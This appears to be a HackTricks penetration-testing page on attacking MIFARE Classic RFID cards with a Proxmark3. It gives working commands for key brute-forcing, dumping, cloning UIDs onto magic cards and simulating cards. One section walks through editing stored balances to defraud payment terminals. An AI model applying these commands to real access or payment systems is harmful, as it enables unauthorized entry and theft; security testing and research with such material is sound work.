# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Attacking RFID Systems with Proxmark3

The first thing you need to do is to have a [**Proxmark3**](https://proxmark.com) and [**install the software and it's dependencie**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Attacking MIFARE Classic 1KB

It has **16 sectors**, each of them has **4 blocks** and each block contains **16B**. The UID is in sector 0 block 0 (and can't be altered).\
To access each sector you need **2 keys** (**A** and **B**) which are stored in **block 3 of each sector** (sector trailer). The sector trailer also stores the **access bits** that give the **read and write** permissions on **each block** using the 2 keys.\
2 keys are useful to give permissions to read if you know the first one and write if you know the second one (for example).

Several attacks can be performed

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

The Proxmark3 allows to perform other actions like **eavesdropping** a **Tag to Reader communication** to try to find sensitive data. In this card you could just sniff the communication with and calculate the used key because the **cryptographic operations used are weak** and knowing the plain and cipher text you can calculate it (`mfkey64` tool).

#### MiFare Classic quick workflow for stored-value abuse

When terminals store balances on Classic cards, a typical end-to-end flow is:

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

Notes

- `hf mf autopwn` orchestrates nested/darkside/HardNested-style attacks, recovers keys, and creates dumps in the client dumps folder.
- Writing block 0/UID only works on magic gen1a/gen2 cards. Normal Classic cards have read-only UID.
- Many deployments use Classic "value blocks" or simple checksums. Ensure all duplicated/complemented fields and checksums are consistent after editing.

See a higher-level methodology and mitigations in:

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT systems sometimes use **nonbranded or noncommercial tags**. In this case, you can use Proxmark3 to send custom **raw commands to the tags**.

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quiting Search
```

With this information you could try to search information about the card and about the way to communicate with it. Proxmark3 allows to send raw commands like: `hf 14a raw -p -b 7 26`

### Scripts

The Proxmark3 software comes with a preloaded list of **automation scripts** that you can use to perform simple tasks. To retrieve the full list, use the `script list` command. Next, use the `script run` command, followed by the script’s name:

```
proxmark3> script run mfkeys
```

You can create a script to **fuzz tag readers**, so copying the data of a **valid card** just write a **Lua script** that **randomize** one or more random **bytes** and check if the **reader crashes** with any iteration.

## References

- [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
